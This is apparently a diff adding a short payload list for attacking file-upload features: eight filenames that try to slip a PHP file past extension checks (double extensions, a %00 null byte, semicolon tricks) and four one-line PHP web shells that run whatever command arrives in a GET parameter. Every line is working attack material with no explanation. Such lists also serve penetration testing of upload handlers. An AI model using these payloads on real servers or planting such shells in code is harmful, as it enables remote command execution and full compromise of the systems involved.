@@ -1,0 +1,12 @@
+file.php.jpg
+file.php%00
+file.php.gif
+file.php.png
+file.php;png
+file.php;jpg
+file.php;.jpg
+file.php;%00.jpg
+<?php system($_GET['x']); ?>
+<?php passthru($_GET['x']); ?>
+<?php shell_exec($_GET['x']); ?>
+<?php exec($_GET['x']); ?>
